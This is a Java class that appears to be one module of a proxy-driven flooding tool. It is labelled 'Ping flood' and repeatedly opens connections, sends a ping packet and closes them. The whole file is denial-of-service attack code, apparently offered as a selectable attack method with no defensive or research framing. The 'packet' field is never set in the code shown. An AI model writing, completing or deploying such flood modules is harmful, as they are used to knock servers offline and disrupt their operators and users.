package dev.lastknell.core.methods.impl;

import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.packets.PingPacket;
import dev.lastknell.core.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Ping implements IMethod{

    private PingPacket packet;

    @Override
    public void accept(Channel channel, Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        packet.write(b);
        channel.writeAndFlush(b);
        channel.close();
    }

    @Override
    public void init(NettyBootstrap service) {
    }

    @Override
    public String getName() {
        return "Ping";
    }

    @Override
    public String getDesc() {
        return "Ping flood";
    }

    @Override
    public boolean isExperimental() {
        return false;
    }
    
}
